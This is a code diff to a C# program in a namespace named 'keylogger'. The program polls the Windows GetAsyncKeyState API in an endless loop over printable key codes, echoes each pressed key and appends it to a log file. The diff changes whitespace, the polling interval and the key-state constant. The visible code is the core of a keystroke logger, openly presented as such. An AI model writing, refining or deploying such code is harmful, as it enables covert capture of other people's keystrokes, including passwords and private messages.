@@ -5,9 +5,10 @@ using System.Threading;
 
 namespace keylogger
 {
+    
     class Program
     {
-        
+       
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
@@ -34,12 +35,16 @@ namespace keylogger
 
             while (true)
             {
-                Thread.Sleep(50);
+                Thread.Sleep(45);
                 for (int i = 32; i < 127; i++)
                 {
+                   
                     int keyState = GetAsyncKeyState(i);
-                    if (keyState == 32768)
+                    if (keyState == 32769)
                     {
+
+
+                       
 
                         Console.Write((char)i + " ");
                         using (StreamWriter sw = File.AppendText(path))
